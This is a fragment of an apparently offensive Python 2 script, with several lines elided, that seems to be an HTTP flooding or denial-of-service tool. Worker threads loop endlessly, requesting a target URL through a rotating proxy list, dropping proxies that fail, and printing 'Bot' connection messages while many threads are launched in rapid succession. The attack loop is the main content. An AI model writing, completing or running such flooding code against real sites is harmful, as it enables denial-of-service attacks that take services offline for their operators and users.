 ...
 def run(self):
  ...
  while True:
   ...
   try:
    ...
    urllib2.urlopen("http://"+url+"/?eyey=262")
    print"\033[1;91m[!]\033[1;91mBot \033[1;92m#{} | \033[1;91mS0u1Server@Bot~:\033[1;92m{} | \033[1;92m[CONNECTED] |".format(c,p)
   except Exception as e:
    try:
     pr.remove(p)
    except:
...
for x in range(1,th+1):
 ...
 t.start()
 v=x
 print"\033[1;93m[+]Starting | thread #{}".format(v)
 time.sleep(.010)